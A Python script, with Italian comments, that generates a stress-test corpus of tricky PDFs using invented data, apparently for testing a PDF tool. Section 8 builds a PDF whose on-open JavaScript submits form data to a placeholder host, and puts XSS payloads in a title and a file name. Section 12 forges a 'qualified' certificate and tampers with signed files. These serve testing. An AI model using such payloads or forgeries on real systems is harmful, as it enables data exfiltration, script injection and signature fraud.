#!/usr/bin/env python3
"""Stress test: file difficili e realistici (dati inventati, nessun dato reale).
Scrive test/stress/corpus/*.pdf (e qualche immagine) e corpus/attese.json con ciò che ogni file contiene di «nascosto».
Uso: python3 test/stress/make_corpus.py"""
import io, json, os, random, subprocess, tempfile
import pikepdf, fitz
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import A4, landscape
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from PIL import Image, ImageDraw, ImageFilter, ImageFont

D = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'corpus'); os.makedirs(D, exist_ok=True)
P = lambda n: os.path.join(D, n)
W, H = A4
FAKE = {'cf': 'RSSMRA80A01H501U', 'cf2': 'BNCLRA85M41F205Z', 'iban': 'IT60X0542811101000000123456', 'nome': 'Mario Rossi', 'tel': '+39 333 123 4567', 'mail': 'mario.rossi@esempio.it'}
for f, n in (('DejaVuSans', '/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf'), ('IPAGothic', '/usr/share/fonts/opentype/ipafont-gothic/ipag.ttf')):
    try: pdfmetrics.registerFont(TTFont(f, n))
    except Exception as e: print('font', f, e)
attese = {}

def para(c, x, y, text, size=11, width=455, font='Helvetica', lead=1.35):
    c.setFont(font, size); words = text.split(); line = ''
    for w in words:
        t = (line + ' ' + w).strip()
        if pdfmetrics.stringWidth(t, font, size) > width: c.drawString(x, y, line); y -= size * lead; line = w
        else: line = t
    if line: c.drawString(x, y, line); y -= size * lead
    return y

LOREM = ('Il presente accordo disciplina i rapporti tra le parti in merito alla fornitura dei servizi descritti negli allegati. '
         'Le condizioni economiche restano invariate per tutta la durata del contratto, salvo diversa pattuizione scritta. '
         'Ogni comunicazione dovrà essere inviata per posta elettronica certificata all\'indirizzo indicato in premessa.')

# 1. dati personali nascosti fuori dal testo della pagina: commenti, campi compilati, allegati, segnalibri, metadati, link
c = canvas.Canvas(P('privacy-nascosti.pdf'), pagesize=A4)
c.setTitle('Pratica di ' + FAKE['nome']); c.setAuthor(FAKE['nome']); c.setSubject('CF ' + FAKE['cf'])
c.setFont('Helvetica', 12); c.drawString(70, 780, 'Pagina 1: richiesta di ' + FAKE['nome'] + ', codice fiscale ' + FAKE['cf'] + '.')
c.bookmarkPage('p1'); c.addOutlineEntry('Pratica ' + FAKE['nome'], 'p1', level=0)
c.showPage(); c.setFont('Helvetica', 12); c.drawString(70, 780, 'Pagina 2: testo senza dati personali.')
c.textAnnotation('Nota interna: bonifico su ' + FAKE['iban'] + ' per ' + FAKE['nome'], Rect=(70, 640, 300, 690), relative=0)
c.acroForm.textfield(name='codice_fiscale', tooltip='Codice fiscale', x=70, y=560, width=250, height=20, value=FAKE['cf2'])
c.acroForm.textfield(name='telefono', tooltip='Telefono', x=70, y=520, width=250, height=20, value=FAKE['tel'])
c.linkURL('mailto:' + FAKE['mail'], (70, 470, 300, 490), relative=0); c.drawString(70, 475, 'Scrivi al responsabile')
c.save()
with pikepdf.open(P('privacy-nascosti.pdf'), allow_overwriting_input=True) as pdf:
    pdf.attachments['documento-identita.txt'] = pikepdf.AttachedFileSpec(pdf, ('Carta di identita di ' + FAKE['nome'] + ' n. CA12345AB').encode())
    with pdf.open_metadata() as m: m['dc:creator'] = [FAKE['nome']]; m['dc:description'] = 'IBAN ' + FAKE['iban']
    pdf.save(P('privacy-nascosti.pdf'))
attese['privacy-nascosti.pdf'] = {'segreti': [FAKE['cf'], FAKE['cf2'], FAKE['iban'], FAKE['tel'].replace(' ', ''), FAKE['mail'], FAKE['nome'], 'CA12345AB'], 'pagine': 2}

# 2. testo nascosto sulla pagina: bianco su bianco, minuscolo, sotto un'immagine, fuori dal ritaglio, livello nascosto
c = canvas.Canvas(P('testo-nascosto.pdf'), pagesize=A4)
c.setFont('Helvetica', 12); c.drawString(70, 780, 'Documento con testo nascosto in vari modi.')
c.setFillColorRGB(1, 1, 1); c.drawString(70, 740, 'Bianco: IBAN ' + FAKE['iban']); c.setFillColorRGB(0, 0, 0)
c.setFont('Helvetica', 1.5); c.drawString(70, 720, 'Minuscolo: CF ' + FAKE['cf'])
c.setFont('Helvetica', 12); c.drawString(70, 690, 'Sotto immagine: tel ' + FAKE['tel'])
img = Image.new('RGB', (400, 40), (200, 210, 230)); b = io.BytesIO(); img.save(b, 'PNG'); b.seek(0)
from reportlab.lib.utils import ImageReader
c.drawImage(ImageReader(b), 65, 680, width=320, height=30)
c.drawString(70, 2000, 'Fuori pagina: ' + FAKE['mail'])
c.save()
doc = fitz.open(P('testo-nascosto.pdf')); ocg = doc.add_ocg('Riservato', on=False)
doc[0].insert_text((70, 200), 'Livello nascosto: ' + FAKE['cf2'], fontsize=12, oc=ocg); doc.save(P('tn.tmp'), garbage=1); doc.close(); os.replace(P('tn.tmp'), P('testo-nascosto.pdf'))
attese['testo-nascosto.pdf'] = {'segreti': [FAKE['iban'], FAKE['cf'], FAKE['tel'].replace(' ', ''), FAKE['cf2']], 'pagine': 1}

# 3. struttura da conservare: segnalibri a più livelli, link interni ed esterni, campi, annotazioni, allegato, 6 pagine
c = canvas.Canvas(P('struttura.pdf'), pagesize=A4)
for i in range(6):
    c.setFont('Helvetica-Bold', 16); c.drawString(70, 780, f'Capitolo {i + 1}'); c.bookmarkPage(f'c{i}')
    c.addOutlineEntry(f'Capitolo {i + 1}', f'c{i}', level=0)
    if i % 2 == 0: c.addOutlineEntry(f'Paragrafo {i + 1}.1', f'c{i}', level=1)
    para(c, 70, 750, LOREM * 3)
    c.linkURL('https://www.esempio.it/capitolo' + str(i + 1), (70, 400, 260, 420), relative=0); c.setFont('Helvetica', 11); c.drawString(70, 405, 'Collegamento esterno')
    if i: c.linkAbsolute('Torna al capitolo 1', 'c0', (300, 400, 480, 420)); c.drawString(300, 405, 'Torna al capitolo 1')
    if i == 2: c.acroForm.textfield(name='nota', x=70, y=300, width=200, height=20, value='valore del campo')
    if i == 3: c.textAnnotation('Commento del revisore', Rect=(70, 300, 200, 340), relative=0)
    c.drawString(270, 40, f'Pagina {i + 1}'); c.showPage()
c.save()
with pikepdf.open(P('struttura.pdf'), allow_overwriting_input=True) as pdf:
    pdf.attachments['allegato.csv'] = pikepdf.AttachedFileSpec(pdf, b'a;b\n1;2\n'); pdf.save(P('struttura.pdf'))
attese['struttura.pdf'] = {'pagine': 6, 'segnalibri': 9, 'link_esterni': 6, 'link_interni': 5, 'campi': 1, 'commenti': 1, 'allegati': 1}

# 4. lingue e scritture: italiano accentato, greco, arabo, giapponese, simboli
c = canvas.Canvas(P('lingue.pdf'), pagesize=A4)
c.setFont('DejaVuSans', 13); y = 780
for t in ['Perché è già così: àèéìòù ÀÈÉÌÒÙ «virgolette» € — …', 'Ελληνικά: Καλημέρα κόσμε', 'Русский: Добрый день', 'Matematica: ∑ ∫ √ ≤ ≥ ≠ ± × ÷ ½ ¾ °C']:
    c.drawString(70, y, t); y -= 30
c.setFont('IPAGothic', 14); c.drawString(70, y, '日本語のテキスト：こんにちは'); y -= 30
c.save()
attese['lingue.pdf'] = {'testi': ['Perché', 'àèéìòù', 'Καλημέρα', 'Добрый', '日本語', '€', '√']}

# 5. due colonne, intestazione e piè di pagina, note, elenco, tabella: per Word ed Excel
c = canvas.Canvas(P('impaginato.pdf'), pagesize=A4)
for pg in range(2):
    c.setFont('Helvetica', 8); c.drawString(70, 815, 'STUDIO ESEMPIO · Relazione tecnica'); c.drawRightString(525, 815, f'Pag. {pg + 1} di 2')
    c.setFont('Helvetica-Bold', 15); c.drawString(70, 780, f'Sezione {pg + 1}: analisi dei consumi')
    y1 = para(c, 70, 750, (LOREM + ' ') * 2 + '¹', width=215, size=10); y2 = para(c, 310, 750, (LOREM + ' ') * 2, width=215, size=10)
    y = min(y1, y2) - 20; c.setFont('Helvetica', 10)
    for k, item in enumerate(['primo punto dell\'elenco', 'secondo punto dell\'elenco', 'terzo punto dell\'elenco']): c.drawString(85, y, f'• {item}'); y -= 15
    y -= 15; rows = [['Mese', 'Consumo kWh', 'Costo €', 'Variazione']] + [[m, f'{1200 + i * 37 + pg * 100}', f'{(1200 + i * 37) * 0.27:.2f}'.replace('.', ','), f'{(-1) ** i * (i + 1) * 1.5:+.1f}%'.replace('.', ',')] for i, m in enumerate(['Gennaio', 'Febbraio', 'Marzo', 'Aprile', 'Maggio', 'Giugno'])]
    xs = [70, 190, 310, 430, 525]
    for r, row in enumerate(rows):
        c.setFont('Helvetica-Bold' if not r else 'Helvetica', 10)
        for k, v in enumerate(row): c.drawString(xs[k] + 4, y - 13, v)
        c.line(70, y, 525, y); y -= 18
    c.line(70, y, 525, y)
    for x in xs: c.line(x, y, x, y + 18 * len(rows))
    c.setFont('Helvetica', 7); c.drawString(70, 50, '¹ Nota: i valori sono stimati sulla base delle letture del contatore.')
    c.setFont('Helvetica', 8); c.drawString(70, 30, 'Documento riservato — uso interno'); c.showPage()
c.save()
attese['impaginato.pdf'] = {'tabella_righe': 7, 'celle': [['Gennaio', '1200'], ['Giugno', '1385']], 'colonne_testo': 2}

# 6. scansioni difficili: fax 1 bit 200 dpi, fotocopia sbiadita, fondino colorato, foto storta con ombra
def page_png(lines, dpi, path):
    with tempfile.TemporaryDirectory() as td:
        src = os.path.join(td, 's.pdf'); cc = canvas.Canvas(src, pagesize=A4); y = 760
        cc.setFont('Times-Roman', 12)
        for t in lines: cc.drawString(70, y, t); y -= 20
        cc.save(); subprocess.run(['pdftoppm', '-r', str(dpi), '-gray', '-png', src, os.path.join(td, 'p')], check=True)
        return Image.open(os.path.join(td, 'p-1.png')).convert('L')
SC = ['Oggetto: comunicazione di variazione del contratto di fornitura', 'Spett.le Ditta Esempio Srl, con la presente si comunica che a', 'decorrere dal 1 marzo 2026 il canone mensile sarà di euro 1.234,56.', 'Codice cliente 00456789 - Pratica n. 2026/118', 'Distinti saluti, Ufficio Contratti']
attese['scan-gt.txt'] = SC
fax = page_png(SC, 200, None).point(lambda v: 0 if v < 150 else 255).convert('1'); rnd = random.Random(1)
fx_ = fax.convert('L'); px = fx_.load()
for _ in range(9000): px[rnd.randrange(fx_.width), rnd.randrange(fx_.height)] = 0 if rnd.random() < 0.5 else 255
fx_.rotate(0.8, fillcolor=255).convert('1').save(P('scan-fax.pdf'), 'PDF', resolution=200)
fad = page_png(SC, 300, None).point(lambda v: int(150 + v * 0.42)).filter(ImageFilter.GaussianBlur(0.9)); fad.save(P('scan-sbiadita.pdf'), 'PDF', resolution=300)
base = page_png(SC, 300, None).convert('RGB'); bg = Image.new('RGB', base.size, (236, 222, 180)); dr = ImageDraw.Draw(bg)
for x in range(0, bg.width, 40): dr.line([(x, 0), (x - 600, bg.height)], fill=(225, 205, 160), width=8)
col = Image.composite(base, bg, base.convert('L').point(lambda v: 255 if v < 160 else 0)); col.save(P('scan-fondino.pdf'), 'PDF', resolution=300)
ph = page_png(SC, 150, None).convert('RGB'); canvas_ = Image.new('RGB', (ph.width + 400, ph.height + 400), (70, 60, 55)); canvas_.paste(ph, (200, 200))
canvas_ = canvas_.rotate(4, fillcolor=(70, 60, 55), resample=Image.BICUBIC); shade = Image.linear_gradient('L').resize(canvas_.size).point(lambda v: int(255 - v * 0.45))
canvas_ = Image.composite(canvas_, Image.new('RGB', canvas_.size, (0, 0, 0)), shade).filter(ImageFilter.GaussianBlur(0.6)); canvas_.save(P('foto-storta.jpg'), quality=82)

# 7. formati interni insoliti: object stream + xref stream, aggiornamento incrementale, xref rotta, CMYK, JPEG2000, molti font
with pikepdf.open(P('struttura.pdf')) as pdf: pdf.save(P('objstm.pdf'), object_stream_mode=pikepdf.ObjectStreamMode.generate)
doc = fitz.open(P('struttura.pdf')); doc[0].insert_text((70, 120), 'Aggiunto in un secondo tempo (revisione 2)', fontsize=11); doc.save(P('incrementale.pdf')); doc.close()
doc = fitz.open(P('struttura.pdf')); doc.save(P('incr2.tmp')); doc.close(); doc = fitz.open(P('incr2.tmp')); doc[0].insert_text((70, 120), 'Aggiunto in un secondo tempo (revisione 2)', fontsize=11); doc.saveIncr(); doc.close(); os.replace(P('incr2.tmp'), P('incrementale.pdf'))
raw = open(P('struttura.pdf'), 'rb').read(); i = raw.rfind(b'startxref'); bad = raw[:i] + b'startxref\n123\n%%EOF\n'; open(P('xref-rotta.pdf'), 'wb').write(bad)
cm = Image.new('CMYK', (1200, 800), (10, 80, 0, 0)); dr = ImageDraw.Draw(cm); dr.rectangle([100, 100, 1100, 700], fill=(0, 0, 0, 255)); cm.save(P('cmyk.jpg'), quality=90)
doc = fitz.open(); pg = doc.new_page(); pg.insert_image(fitz.Rect(70, 70, 525, 370), filename=P('cmyk.jpg')); pg.insert_text((70, 420), 'Immagine CMYK sopra; JPEG2000 sotto', fontsize=12)
try:
    j2 = Image.new('RGB', (900, 500), (40, 120, 200)); ImageDraw.Draw(j2).ellipse([100, 50, 800, 450], fill=(250, 200, 30)); j2.save(P('img.jp2'))
    pg.insert_image(fitz.Rect(70, 450, 525, 700), filename=P('img.jp2'))
except Exception as e: print('jp2', e)
doc.save(P('immagini-speciali.pdf')); doc.close()
for f in ('cmyk.jpg', 'img.jp2'):
    try: os.remove(P(f))
    except FileNotFoundError: pass

# 8. sicurezza: JavaScript all'apertura, nome e titolo con HTML, password del proprietario (si apre ma con limiti), AES-256
c = canvas.Canvas(P('js.pdf'), pagesize=A4); c.setTitle('<img src=x onerror="window.__xss=1">'); c.drawString(70, 780, 'PDF con JavaScript all\'apertura.'); c.save()
with pikepdf.open(P('js.pdf'), allow_overwriting_input=True) as pdf:
    pdf.Root.OpenAction = pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String('app.alert("ciao"); this.submitForm("https://esempio.invalid/raccolta");'))
    pdf.save(P('js.pdf'))
import shutil; shutil.copy(P('js.pdf'), P('<img src=x onerror=window.__xss=2>.pdf'))
with pikepdf.open(P('struttura.pdf')) as pdf:
    pdf.save(P('limitato.pdf'), encryption=pikepdf.Encryption(owner='proprietario', user='', allow=pikepdf.Permissions(extract=False, modify_other=False, print_lowres=False, print_highres=False)))
    pdf.save(P('aes256.pdf'), encryption=pikepdf.Encryption(owner='proprietario', user='utente-360', R=6))
attese['aes256.pdf'] = {'password': 'utente-360'}

# 9. grandi: 1000 pagine di testo, 40 foto ad alta risoluzione (~50 MB), pagina gigante (5 m), pagine di 7 formati
c = canvas.Canvas(P('mille.pdf'), pagesize=A4)
for i in range(1000): c.setFont('Helvetica', 10); para(c, 70, 780, f'Pagina {i + 1}. ' + LOREM * 4); c.showPage()
c.save()
doc = fitz.open(); rnd = random.Random(7)
for i in range(40):
    im = Image.effect_noise((3000, 2000), 60).convert('RGB'); b = io.BytesIO(); im.save(b, 'JPEG', quality=92)
    pg = doc.new_page(width=842, height=595); pg.insert_image(pg.rect, stream=b.getvalue()); pg.insert_text((40, 40), f'Foto {i + 1}', fontsize=20)
doc.save(P('foto-pesanti.pdf')); doc.close()
c = canvas.Canvas(P('pagina-gigante.pdf'), pagesize=(14000, 3000)); c.setFont('Helvetica', 200); c.drawString(500, 1500, 'Tavola lunga cinque metri'); c.rect(100, 100, 13800, 2800); c.save()
c = canvas.Canvas(P('formati.pdf'))
for (w, h) in [(595, 842), (842, 595), (420, 595), (1191, 842), (612, 792), (283, 425), (2384, 3370)]:
    c.setPageSize((w, h)); c.setFont('Helvetica', 14); c.drawString(30, h - 40, f'{w}×{h} pt'); c.showPage()
c.save()

# 10. firmato PAdES (copiato dalle prove esistenti): gli strumenti che lo cambiano devono avvisare che la firma non vale più
shutil.copy(os.path.join(os.path.dirname(D), '..', 'fixtures', 'firmato-pades.pdf'), P('firmato-pades.pdf'))

# 11. accessibile (con struttura/tag), prodotto da LibreOffice: gli strumenti dovrebbero conservare i tag
with tempfile.TemporaryDirectory() as td:
    import docx
    d = docx.Document(); d.add_heading('Relazione accessibile', 0); d.add_heading('Premessa', 1); d.add_paragraph(LOREM)
    t = d.add_table(rows=3, cols=2); t.style = 'Table Grid'
    for r in range(3):
        for k in range(2): t.cell(r, k).text = f'cella {r}{k}'
    d.save(os.path.join(td, 'acc.docx'))
    subprocess.run(['soffice', '--headless', '--convert-to', 'pdf:writer_pdf_Export:{"UseTaggedPDF":{"type":"boolean","value":"true"}}', '--outdir', td, os.path.join(td, 'acc.docx')], check=True, capture_output=True, timeout=180)
    shutil.copy(os.path.join(td, 'acc.pdf'), P('accessibile.pdf'))

# 12. firme: certificato fatto in casa che si dichiara «qualificato»; p7m vero con il contenuto alterato; PDF firmato e poi cambiato
with tempfile.TemporaryDirectory() as td:
    open(os.path.join(td, 'qc.cnf'), 'w').write("[req]\ndistinguished_name=dn\nprompt=no\nx509_extensions=ext\n[dn]\nCN=FIRMATARIO FALSO\nC=IT\nO=Ente Inesistente\n[ext]\nbasicConstraints=CA:FALSE\nkeyUsage=critical,nonRepudiation\nqcStatements=DER:30:0a:30:08:06:06:04:00:8e:46:01:01\n")
    subprocess.run(['openssl', 'req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-keyout', os.path.join(td, 'k.pem'), '-out', os.path.join(td, 'c.pem'), '-days', '400', '-config', os.path.join(td, 'qc.cnf')], check=True, capture_output=True)
    cc = canvas.Canvas(os.path.join(td, 'doc.pdf')); cc.drawString(70, 760, 'Determina n. 12: documento firmato con un certificato fatto in casa.'); cc.save()
    subprocess.run(['openssl', 'cms', '-sign', '-binary', '-nodetach', '-in', os.path.join(td, 'doc.pdf'), '-signer', os.path.join(td, 'c.pem'), '-inkey', os.path.join(td, 'k.pem'), '-outform', 'DER', '-out', P('firma-falsa.pdf.p7m'), '-md', 'sha256'], check=True)
raw = bytearray(open(os.path.join(os.path.dirname(D), '..', 'fixtures', 'firmato-cades.pdf.p7m'), 'rb').read())
k = raw.find(b'BT'); k = k if k > 0 else len(raw) // 2
raw[k + 10] = (raw[k + 10] + 1) % 256; open(P('firma-manomessa.pdf.p7m'), 'wb').write(bytes(raw))
shutil.copy(P('firmato-pades.pdf'), P('pades-modificato.pdf')); doc = fitz.open(P('pades-modificato.pdf')); doc[0].insert_text((70, 100), 'Importo cambiato dopo la firma: euro 99.000', fontsize=11); doc.saveIncr(); doc.close()
# 13. taggato su più pagine, con collegamenti (annotazioni nella struttura), elenco e tabella: Unisci/Organizza/Dividi devono
#     conservare i tag delle pagine che restano
def tagged_doc(out):
    from docx.oxml.ns import qn
    from docx.oxml import OxmlElement
    from docx.enum.text import WD_BREAK
    with tempfile.TemporaryDirectory() as td:
        d = docx.Document(); d.add_heading('Manuale del volontario', 0)
        for k, tit in enumerate(['Accoglienza', 'Turni', 'Sicurezza', 'Contatti']):
            d.add_heading(f'{k + 1}. {tit}', 1); d.add_paragraph(LOREM)
            for j in range(3): d.add_paragraph(f'Punto {j + 1} del capitolo {tit.lower()}', style='List Bullet')
            par = d.add_paragraph('Approfondimenti sul sito: ')
            rid = d.part.relate_to(f'https://esempio.invalid/{tit.lower()}', 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink', is_external=True)
            hl = OxmlElement('w:hyperlink'); hl.set(qn('r:id'), rid); r = OxmlElement('w:r'); t = OxmlElement('w:t'); t.text = f'pagina {tit.lower()}'; r.append(t); hl.append(r); par._p.append(hl)
            if k == 1:
                tb = d.add_table(rows=3, cols=3); tb.style = 'Table Grid'
                for a in range(3):
                    for b in range(3): tb.cell(a, b).text = f'turno {a}{b}'
            if k < 3: d.add_paragraph().add_run().add_break(WD_BREAK.PAGE)
        d.save(os.path.join(td, 'tg.docx'))
        subprocess.run(['soffice', '--headless', '--convert-to', 'pdf:writer_pdf_Export:{"UseTaggedPDF":{"type":"boolean","value":"true"}}', '--outdir', td, os.path.join(td, 'tg.docx')], check=True, capture_output=True, timeout=180)
        shutil.copy(os.path.join(td, 'tg.pdf'), out)
tagged_doc(P('taggato.pdf'))
json.dump(attese, open(P('attese.json'), 'w'), ensure_ascii=False, indent=1)
print('ok', sorted(f for f in os.listdir(D)))
